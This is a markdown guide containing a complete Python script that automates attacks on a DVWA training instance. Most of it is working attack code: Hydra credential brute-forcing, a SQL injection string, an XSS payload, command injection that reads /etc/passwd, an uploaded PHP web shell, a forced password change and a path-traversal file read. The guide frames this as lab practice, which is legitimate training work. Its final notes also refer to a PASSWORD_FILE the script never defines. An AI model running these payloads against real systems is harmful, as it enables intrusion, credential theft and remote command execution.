# DVWA Attack Automation Script

This script demonstrates how to automate the execution of all major pentesting attack types against DVWA at http://10.30.0.235/dvwa for educational and authorized testing purposes only.

**WARNING:** Only use this script in a legal, controlled environment (e.g., your own DVWA lab). Unauthorized use is illegal and unethical.

---

## Prerequisites

- Python 3.x
- requests
- BeautifulSoup4
- Optional: selenium, paramiko, etc. for advanced attacks

Install dependencies:

```bash
pip3 install requests beautifulsoup4
```

---

## Script: dvwa_attack_automation.py

```python
#!/usr/bin/env python3
"""
Automate major pentesting attack types against DVWA (http://10.30.0.235/dvwa)
"""
import requests
from bs4 import BeautifulSoup
import time
import subprocess # Added for Hydra
import os # Added for checking Hydra output
import tempfile # Added for temporary credentials file
import re # Added for parsing Hydra output

DVWA_URL = "http://10.30.0.235/dvwa"
LOGIN_URL = f"{DVWA_URL}/login.php"
USERNAME = "admin" # Default username for initial login and other tests
PASSWORD = "password"  # Default password for initial login and other tests

session = requests.Session()

# --- 1. Login Function ---
def login(user=USERNAME, pwd=PASSWORD): # Allow dynamic user/pass for login
    r = session.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, 'html.parser')
    user_token_tag = soup.find('input', {'name': 'user_token'})
    if not user_token_tag:
        print(f"[!] Could not find user_token on login page. Page content: {r.text[:500]}")
        # Fallback or error handling if token is not found
        # This might happen if DVWA setup is not complete or security level changes form
        # For now, we'll try to proceed without it if it's missing, though login will likely fail
        user_token = "" # Or handle error more gracefully
    else:
        user_token = user_token_tag['value']

    data = {
        'username': user,
        'password': pwd,
        'Login': 'Login',
        'user_token': user_token
    }
    try:
        resp = session.post(LOGIN_URL, data=data)
        if 'Login failed' in resp.text or 'login.php' in resp.url:
             print(f"[-] Login failed for {user}")
             return False
        assert 'Logout' in resp.text, f"Login failed for user {user}!"
        print(f"[+] Logged in to DVWA as {user}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[!] RequestException during login for {user}: {e}")
        return False
    except AssertionError as e:
        print(f"[-] {e}")
        return False


# --- 2. Reconnaissance ---
def reconnaissance():
    print("[+] Performing HTTP header analysis...")
    r = session.get(DVWA_URL)
    print(r.headers)
    print("[+] Directory brute force (sample)...")
    for path in ['admin', 'phpmyadmin', 'test', 'backup']:
        url = f"{DVWA_URL}/{path}"
        resp = session.get(url)
        print(f"{url} => {resp.status_code}")

# --- 3. Brute Force Attack ---
def brute_force():
    print("[+] Attempting brute force on login using Hydra with a custom list...")

    try:
        subprocess.run(['hydra', '-h'], capture_output=True, check=True, text=True)
        print("[i] Hydra is installed.")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[!] Hydra is not installed or not in PATH. Skipping brute force attack.")
        print("    Please install Hydra (e.g., 'sudo apt install hydra') and ensure it's in your PATH.")
        return

    # List of user:password pairs to try
    credentials_list = [
        "msfadmin:msfadmin",
        "user1:Password123",
        "testuser:testpass",
        "dvwauser:dvwa",
        "admin:12345" # A common guess, different from the actual default
    ]

    # Get a fresh user_token for the Hydra command template
    # This token might be static per session start for DVWA low, but good practice to fetch
    try:
        r_token = requests.get(LOGIN_URL) # Use fresh requests, not session
        soup_token = BeautifulSoup(r_token.text, 'html.parser')
        user_token_hydra = soup_token.find('input', {'name': 'user_token'})['value']
    except Exception as e:
        print(f"[!] Failed to retrieve user_token for Hydra template: {e}")
        return

    with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as tmp_creds_file:
        for cred in credentials_list:
            tmp_creds_file.write(cred + '\n')
        tmp_creds_file_path = tmp_creds_file.name

    print(f"[i] Credentials list for Hydra written to: {tmp_creds_file_path}")

    hydra_command = [
        'hydra',
        '-C', tmp_creds_file_path, # Use colon-separated user:pass file
        f"{DVWA_URL.replace('http://', '').replace('https://', '')}",
        'http-post-form',
        # DVWA login form structure: username, password, Login (button), user_token
        # Success condition: "Logout" appears in the response body. Failure: "Login failed"
        f"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login&user_token={user_token_hydra}:S=Logout:F=Login failed"
    ]

    print(f"[i] Executing Hydra: {' '.join(hydra_command)}")
    found_creds = None
    try:
        process = subprocess.run(hydra_command, capture_output=True, text=True, timeout=300)
        output = process.stdout
        print("[+] Hydra Output:")
        print(output)

        # More robust parsing for Hydra's output
        # Example line: [80][http-post-form] host: 10.30.0.235   login: admin   password: password
        match = re.search(r"login:\s*(\S+)\s*password:\s*(\S+)", output, re.IGNORECASE)

        if match and "1 valid password found" in output:
            found_user = match.group(1)
            found_password = match.group(2)
            print(f"[!] Brute force success with Hydra! User: {found_user}, Password: {found_password}")

            # Attempt to login with the found credentials using the main session
            # Create a new session for verification to not interfere with the main one if needed,
            # or update global USERNAME/PASSWORD if this is desired.
            # For now, just verify with the main session.
            print(f"[i] Verifying login with found credentials: {found_user}:{found_password}")
            if login(user=found_user, pwd=found_password): # Use the login function
                print(f"[+] Successfully logged in with Hydra found credentials: {found_user}:{found_password}")
                # Potentially update global USERNAME/PASSWORD here if script should use new creds
                # For now, we will re-login with original creds later anyway.
                found_creds = (found_user, found_password)
            else:
                print(f"[-] Hydra reported success, but login verification failed for {found_user}:{found_password}")
        elif "0 valid passwords found" in output:
            print("[-] Hydra finished, but no valid passwords found.")
        else:
            print("[i] Hydra command executed. Review output for details. It might have failed or found no passwords.")
            if process.stderr:
                print("[!] Hydra Errors:")
                print(process.stderr)

    except subprocess.TimeoutExpired:
        print("[!] Hydra command timed out.")
    except FileNotFoundError:
        print("[!] Hydra command not found. Make sure Hydra is installed and in your PATH.")
    except Exception as e:
        print(f"[!] An error occurred while running Hydra: {e}")
    finally:
        os.remove(tmp_creds_file_path) # Clean up the temporary file
        print(f"[i] Temporary credentials file {tmp_creds_file_path} removed.")

    return found_creds # Return found credentials or None

# --- 4. SQL Injection ---
def sql_injection():
    print("[+] Performing SQL Injection...")
    inj_url = f"{DVWA_URL}/vulnerabilities/sqli/?id=1' OR 1=1--&Submit=Submit"
    r = session.get(inj_url)
    if 'First name' in r.text:
        print("[!] SQL Injection successful!")

# --- 5. XSS ---
def xss():
    print("[+] Performing XSS attack...")
    xss_url = f"{DVWA_URL}/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>&Submit=Submit"
    r = session.get(xss_url)
    if '<script>alert' in r.text:
        print("[!] XSS payload reflected!")

# --- 6. Command Injection ---
def command_injection():
    print("[+] Performing Command Injection...")
    ci_url = f"{DVWA_URL}/vulnerabilities/exec/"
    data = {'ip': '127.0.0.1; cat /etc/passwd', 'Submit': 'Submit'}
    r = session.post(ci_url, data=data)
    if 'root:x:' in r.text:
        print("[!] Command Injection successful!")

# --- 7. File Upload ---
def file_upload():
    print("[+] Attempting file upload...")
    upload_url = f"{DVWA_URL}/vulnerabilities/upload/"
    files = {'uploaded': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
    data = {'Upload': 'Upload'}
    r = session.post(upload_url, files=files, data=data)
    if 'shell.php' in r.text:
        print("[!] File upload may be successful!")

# --- 8. CSRF ---
def csrf():
    print("[+] Attempting CSRF attack (change password)...")
    profile_url = f"{DVWA_URL}/vulnerabilities/csrf/"
    r = session.get(profile_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'})['value']
    data = {
        'password_new': 'newpass',
        'password_conf': 'newpass',
        'Change': 'Change',
        'user_token': user_token
    }
    resp = session.post(profile_url, data=data)
    if 'Password Changed' in resp.text:
        print("[!] CSRF successful!")

# --- 9. LFI/RFI ---
def lfi():
    print("[+] Attempting LFI...")
    lfi_url = f"{DVWA_URL}/vulnerabilities/fi/?page=../../../../etc/passwd"
    r = session.get(lfi_url)
    if 'root:x:' in r.text:
        print("[!] LFI successful!")

# --- 10. Logout ---
def logout():
    # Ensure we are logged in before trying to logout, to avoid errors if brute_force failed
    # and subsequent attacks were skipped or if login itself failed.
    # A simple check could be if ' Logout ' is in a known page like index.php
    try:
        r_check = session.get(DVWA_URL + "/index.php")
        if "Logout" in r_check.text:
            session.get(f"{DVWA_URL}/logout.php")
            print("[+] Logged out.")
        else:
            print("[i] Not logged in or session expired, skipping logout.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during logout check: {e}")


if __name__ == "__main__":
    initial_login_success = login() # Initial login to set up session cookies for other attacks

    if not initial_login_success:
        print("[!] Initial login failed. Some attacks might not work. Exiting.")
        # exit(1) # Optionally exit if initial login is critical

    reconnaissance()

    found_credentials_by_hydra = brute_force()

    # Re-login with the original credentials to ensure session validity for subsequent attacks,
    # unless Hydra found the original ones or we decide to use Hydra's findings.
    # If Hydra found different credentials and successfully logged in, the session is now for that user.
    # For consistency in subsequent tests that assume 'admin':'password', we re-login.
    print("[i] Re-logging in with original credentials (admin:password) to ensure session state for subsequent attacks...")
    login(USERNAME, PASSWORD) # Explicitly use original USERNAME, PASSWORD

    sql_injection()
    xss()
    command_injection()
    file_upload()
    csrf()
    lfi()
    logout()
    print("[+] All attacks attempted. Review DVWA for results.")
```

---

**Note:**

- This script covers: reconnaissance, brute force (now with Hydra using a dynamic list of 5 user:pass pairs including msfadmin), SQLi, XSS, command injection, file upload, CSRF, LFI, and logout.
- For privilege escalation, persistence, exfiltration, and DoS, use manual or advanced tools (Metasploit, custom scripts, etc.).
- Always reset DVWA to a safe state after testing.
- **Ensure Hydra is installed (`sudo apt install hydra`) and the `PASSWORD_FILE` path is correct.**
